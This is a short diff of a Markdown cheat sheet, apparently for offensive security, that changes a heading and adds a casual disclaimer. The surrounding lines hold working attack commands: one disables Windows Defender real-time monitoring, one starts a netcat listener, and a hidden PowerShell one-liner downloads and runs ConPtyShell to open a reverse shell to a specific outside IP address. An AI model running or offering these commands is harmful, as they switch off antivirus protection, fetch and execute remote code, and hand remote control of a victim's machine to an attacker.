@@ -33,7 +33,7 @@ Disclaimer : Many of The Stuff presented here May/May-not work for you, this is 
 ```
 Set-MpPreference -DisableRealtimeMonitoring $true
 ```
-### Listener -
+### Listener (Linux Recomended)-
 ```
 sudo stty raw -echo; (stty size; cat) | nc -lvnp 443
 ```
@@ -41,3 +41,5 @@ sudo stty raw -echo; (stty size; cat) | nc -lvnp 443
 ```
 powershell -w hidden {IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 40.71.97.253 443}
 ```
+
+This Page May Have Loads or Error's I suck at english so avoid em pls lol...
